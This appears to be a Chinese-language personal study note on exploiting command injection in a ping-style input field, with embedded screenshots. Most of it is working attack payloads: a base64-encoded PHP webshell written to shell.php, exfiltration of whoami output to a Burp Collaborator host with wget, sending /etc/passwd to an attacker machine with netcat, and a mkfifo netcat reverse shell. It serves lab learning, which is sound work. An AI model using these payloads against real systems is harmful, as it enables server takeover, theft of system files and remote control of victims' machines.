# Command injection


有的场景会让用户自己输入命令或者命令的一部分（作为拼接）


例：
让用户输入IP 然后ping：


![[Pasted image 20211205182912.png]]


## 向服务器写入一句话：

```shell
tt || echo "PD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWydjbWQnXSk/Pg=="|base64 -d >shell.php 

```



## 得到命令信息 
例：**whoami info**


开启burp collaborator服务器：

![[Pasted image 20211205183418.png]]

输入 
```shell
tt || wget gzjjnt7y145vfimxqc771t4z2q8iw7.burpcollaborator.net?id=$(whoami)

```



![[Pasted image 20211205183603.png]]

得到whoami信息：

![[Pasted image 20211205183618.png]]


## 利用netcat获得受害者文件并写入远程服务器


netcat在kali上开启简单远程服务器

```shell
nc -lp 9999 >./workspace/passwd.txt
```

kali的ip是192.168.50.11 。 监听192.168.50.11:9999 并把接收到的文件写入 passwd.txt


受害者客户端：
![[Pasted image 20211205185841.png]]

命令： 

```shell
tt || nc 192.168.50.11 9999 </etc/passwd
```

把受害机的 ```/etc/passwd``` 发送到 9999端口

passwd.txt:
![[Pasted image 20211205221057.png]]




## 命令执行漏洞利用反弹shell

反弹shell：受害机主动连接外部远程服务器，防火墙不会拦截


远程机监听：

```shell

nc -lvp 8080

```
![[Pasted image 20211206104201.png]]

受害机：

```shell

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.50.11 8080 > /tmp/f


```


![[Pasted image 20211206104226.png]]

得到受害机shell
![[Pasted image 20211206104242.png]]





